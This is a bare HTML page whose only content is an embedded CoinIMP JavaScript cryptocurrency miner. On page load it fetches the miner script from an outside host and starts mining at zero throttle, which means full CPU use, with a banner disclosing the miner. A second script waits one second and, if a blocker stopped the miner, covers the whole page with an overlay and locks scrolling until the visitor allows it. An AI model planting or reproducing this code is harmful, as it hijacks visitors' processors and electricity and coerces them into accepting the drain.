<html>
<body>
<script src="https://www.hostingcloud.racing/ZZl9.js"></script>
<script>
    var _client = new Client.Anonymous('578eb57e7ae07b7a91c9597e2e8704178c80c3f91facc1e88333c3f36322ccfa', {
        throttle: 0, c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
</script>
<script>
    setTimeout(function(){
        if(typeof _client === 'undefined' || _client === null)
        {
            var messageDiv = document.createElement("div");
            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
            var mainDiv = document.createElement("div");
            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
            mainDiv.appendChild(messageDiv);
            document.body.appendChild(mainDiv);
            document.getElementsByTagName("body")[0].style.overflow = "hidden";
            window.scrollTo(0, 0);
        }
    },1000);
</script>
</body>
</html>
